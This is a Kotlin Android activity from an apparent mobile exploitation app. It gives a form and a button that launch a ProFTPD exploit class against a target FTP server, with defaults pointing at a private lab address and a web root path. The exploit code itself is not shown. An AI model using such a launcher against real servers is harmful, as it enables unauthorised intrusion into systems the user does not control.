package me.smoothhacker.swampsploit.ui.exploit

import android.os.Bundle
import android.os.Looper
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import me.smoothhacker.swampsploit.databinding.ActivityExploitBinding
import me.smoothhacker.swampsploit.exploit.ProFTPD

class ExploitActivity : AppCompatActivity() {

    private lateinit var binding: ActivityExploitBinding

    @OptIn(DelicateCoroutinesApi::class)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityExploitBinding.inflate(layoutInflater)
        setContentView(binding.root)
        val root: View = binding.root

        binding.ipAddressInput.setText("172.28.128.3")
        binding.portNumberInput.setText("21")
        binding.timeoutInput.setText("1000")
        binding.tempPathInput.setText("/tmp")
        binding.sitePathInput.setText("/var/www/html")

        binding.exploitButton.setOnClickListener {
            val exploit = ProFTPD(
                binding.ipAddressInput.text.toString(),
                binding.portNumberInput.text.toString().toInt(),
                binding.timeoutInput.text.toString().toInt(),
                binding.tempPathInput.text.toString(),
                binding.sitePathInput.text.toString(),
            )
            val context = this
            Thread {
                val r = exploit.exploit()
                val result = when (r) {  true-> "Success!" false -> "Failed" }
                Log.w("proftpd","result: $result")
                Looper.prepare()
                Toast.makeText(context, result, Toast.LENGTH_SHORT).show()
            }.start()
        }
    }
}